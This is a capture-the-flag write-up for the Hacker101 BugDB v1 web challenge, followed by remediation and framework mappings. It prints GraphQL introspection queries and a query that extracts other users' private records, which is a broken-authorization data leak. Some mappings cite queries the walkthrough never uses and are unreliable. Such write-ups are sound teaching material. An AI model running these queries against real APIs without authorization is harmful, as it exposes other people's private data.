# BugDB v1: Writeup (1/1)

**Difficulty:** Easy  
**Category:** Web, GraphQL  
**Flags:** 1/1 (complete)  
**Platform:** Hacker101 CTF

---

## About the Challenge

**Context:** A GraphQL bug reporting API. Users can report public and private bugs. The flag is in a private bug from another user that should not be accessible.

**What you face:** A GraphQL endpoint with no visible documentation. The schema must be discovered via introspection, and the correct query to access private bugs from other users must be constructed.

**Vulnerabilities exploited:**
- Unrestricted GraphQL Introspection (OWASP API9): exposes the complete schema including available types and queries
- Broken Object Level Authorization / BOLA (CWE-639): `allUsers` returns private bugs from all users without checking authentication

**What you learn:**
- GraphQL introspection should be disabled in production (`__schema`, `__type`)
- The query `{ user { edges { node { bugs { edges { node { text private } } } } } } }` is the canonical path to exfiltrate private bugs
- BOLA in GraphQL occurs when resolvers do not verify whether the current user has access to the object
- Tools like Altair or Insomnia facilitate GraphQL exploitation with autocomplete via introspection

---

## Objective

Exploit the GraphQL API without authentication to extract sensitive data (private bug reports).

## Prerequisites

- Active BugDB v1 instance
- Any HTTP client or GraphQL tool (Burp Suite, GraphiQL, curl)

---

## Flag 0: GraphQL Introspection + Data Exfiltration

**Vulnerability:** Introspection enabled in production + absence of field-level access control.

### Step 1: Schema discovery via introspection

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Returns all available types in the schema.

### Step 2: Map available fields on the Query type

```graphql
query {
  __type(name: "Query") {
    fields {
      name
      description
      args {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```

### Step 3: Extract all users and bugs (including private ones)

```graphql
query {
  user {
    edges {
      node {
        id
        username
        bugs {
          pageInfo {
            startCursor
            endCursor
          }
          edges {
            cursor
            node {
              id
              reporterId
              text
              private
              reporter {
                id
              }
            }
          }
        }
      }
    }
  }
}
```

The `text` field of private bugs (`private: true`) contains the flag.

### Alternative: list users first

```graphql
query {
  allUsers(first: 5) {
    edges {
      node {
        id
        username
      }
    }
  }
}
```

---

## Lessons Learned

1. **Introspection in production** exposes the entire API structure
2. **Absence of field-level authorization** allows reading private data without authentication
3. **GraphQL Relay pattern (edges/nodes)** requires adapted queries to correctly extract data
4. **Fields marked `private: true`** are semantically private but technically accessible without authorization

## MITRE ATT&CK Mapping

| ID | Technique | Tactic | How it was used |
|----|-----------|--------|----------------|
| T1190 | Exploit Public-Facing Application | Initial Access | GraphQL introspection to discover schema and hidden queries |
| T1087.001 | Account Discovery: Local Account | Discovery | Enumerated users via GraphQL `allUsers` query |
| T1530 | Data from Cloud Storage Object | Collection | Accessed another user's bugs via IDOR on `user(id:)` query |
| T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | Extracted private bug reports containing sensitive data |

## Remediation and Containment

### Technical Fixes

- Disable introspection in production
- Implement field-level authorization
- Validate user permissions before returning private data
- Add rate limiting and query complexity limits

### OWASP Top 10 2021

| ID | Category | Relevance |
|----|----------|-----------|
| A01:2021 | Broken Access Control | IDOR: querying other users' bugs without authorization |
| A05:2021 | Security Misconfiguration | GraphQL introspection enabled in production |

### OWASP API Security Top 10 2023

| ID | Category | Relevance |
|----|----------|-----------|
| API1:2023 | Broken Object Level Authorization | `user(id:)` returns any user's bugs without ownership check |
| API3:2023 | Broken Object Property Level Authorization | All fields exposed via introspection without filtering |
| API8:2023 | Security Misconfiguration | Introspection enabled; exposes full schema to attackers |

### MITRE D3FEND Countermeasures

| ID | Technique | Application |
|----|-----------|-------------|
| D3-ACL | Access Control List | Enforce per-object authorization on GraphQL resolvers |
| D3-SPP | Strong Password Policy | Restrict API access; require authentication for all queries |

### NIST CSF 2.0

| Function | Category | Application |
|----------|----------|-------------|
| ID (Identify) | ID.AM | Inventory all GraphQL endpoints and their exposure level |
| PR (Protect) | PR.AC | Object-level authorization on every resolver |
| DE (Detect) | DE.CM | Monitor GraphQL query patterns for introspection and enumeration |

### NIST SP 800-53 Rev. 5

| Control | Title | Application |
|---------|-------|-------------|
| AC-3 | Access Enforcement | Enforce authorization checks on every GraphQL resolver |
| AC-4 | Information Flow Enforcement | Prevent cross-user data access in API responses |
| CM-7 | Least Functionality | Disable introspection and unused queries in production |
| AU-3 | Content of Audit Records | Log all GraphQL operations with user context |

### C2M2

| Domain | Practice | MIL | Application |
|--------|----------|-----|-------------|
| ACCESS | Access Control Management | MIL-2 | Enforce BOLA controls on all GraphQL resolvers |
| THREAT | Threat and Vulnerability Management | MIL-2 | Periodic API security testing; schema review |

---

## Final Thoughts

Thanks guys!! (❍ᴥ❍ʋ)

---

GraphQL introspection is a goldmine for attackers: it hands them the entire schema, including queries and types that were never meant to be public. Combine that with missing object-level authorization and you have full BOLA exploitation in a few queries. Always disable introspection in production and enforce authorization at the resolver level, not the route level.

Follow me for more writeups and security content:

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
